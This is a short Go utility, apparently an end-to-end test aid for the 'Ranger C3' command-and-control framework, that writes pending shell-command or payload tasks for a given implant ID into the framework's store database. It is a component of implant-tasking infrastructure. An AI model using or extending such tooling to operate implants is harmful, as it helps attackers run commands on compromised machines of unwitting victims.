// taskpush - create a pending task via the production Ranger C3 store code (E2E aid).
// Staged into the RANGER_C3 module tree by scripts/e2e_local.sh.
//
// usage: taskpush <db> <implant_id> <shell-command>
//        taskpush <db> <implant_id> payload <payload_name> [key=value ...]
package main

import (
	"fmt"
	"os"
	"strings"

	"git.churchofmalware.org/ek0mssavi0r/Ranger-C3/internal/protocol"
	"git.churchofmalware.org/ek0mssavi0r/Ranger-C3/internal/store"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Fprintln(os.Stderr, "usage: taskpush <db> <implant_id> <shell-command>")
		fmt.Fprintln(os.Stderr, "       taskpush <db> <implant_id> payload <name> [key=value ...]")
		os.Exit(2)
	}
	st, err := store.New(os.Args[1])
	if err != nil {
		fmt.Fprintln(os.Stderr, "open db:", err)
		os.Exit(1)
	}
	defer st.Close()

	id := os.Args[2]
	var t *protocol.Task
	if os.Args[3] == "payload" {
		if len(os.Args) < 5 {
			fmt.Fprintln(os.Stderr, "payload task needs a module name")
			os.Exit(2)
		}
		payload := map[string]any{"name": os.Args[4]}
		for _, a := range os.Args[5:] {
			kv := strings.SplitN(a, "=", 2)
			if len(kv) == 2 {
				payload[kv[0]] = kv[1]
			}
		}
		t, err = st.CreateTask(id, "payload", "ws", payload)
	} else {
		t, err = st.CreateTask(id, "shell", "ws", map[string]any{"command": os.Args[3]})
	}
	if err != nil {
		fmt.Fprintln(os.Stderr, "create task:", err)
		os.Exit(1)
	}
	fmt.Println("created task", t.ID, "for", id)
}
